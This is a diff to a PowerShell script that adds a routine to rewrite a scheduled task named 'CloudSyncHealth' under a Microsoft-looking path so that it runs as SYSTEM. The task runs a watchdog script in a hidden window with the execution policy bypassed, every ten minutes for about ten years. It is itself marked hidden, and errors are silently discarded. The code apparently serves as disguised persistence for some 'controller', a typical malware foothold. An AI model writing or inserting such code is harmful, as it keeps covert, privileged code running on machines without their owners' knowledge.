@@ -179,3 +179,23 @@ if ($info.tasks) {
 }
 
 if ($restored -gt 0) { Say "restored $restored file(s)" }
+
+# ---- 6. keep the health task logged-off capable ---------------------------
+# A group principal (BUILTIN\Users) only runs as a signed-in member, so this
+# watchdog never fires on a machine with nobody logged on - the controller then
+# stays dead. Repair the task to run as SYSTEM, and give the repeat a long life
+# (the shipped task used to expire after 1 day).
+try {
+    $hPath = '\Microsoft\Windows\CloudSync\'
+    $hName = 'CloudSyncHealth'
+    $hXml = (schtasks.exe /Query /TN ($hPath + $hName) /XML 2>$null) -join "`n"
+    if ($hXml -match '<GroupId>') {
+        $hAct = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$(Join-Path $dir 'watchdog.ps1')`"")
+        $hT1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 3650)
+        $hT2 = New-ScheduledTaskTrigger -Daily -At '03:47'
+        $hSet = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        $hPrin = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+        Register-ScheduledTask -TaskName $hName -TaskPath $hPath -Action $hAct -Trigger @($hT1,$hT2) -Settings $hSet -Principal $hPrin -Force | Out-Null
+        Say 'health task principal repaired (SYSTEM) - it now runs with nobody logged on'
+    }
+} catch { }
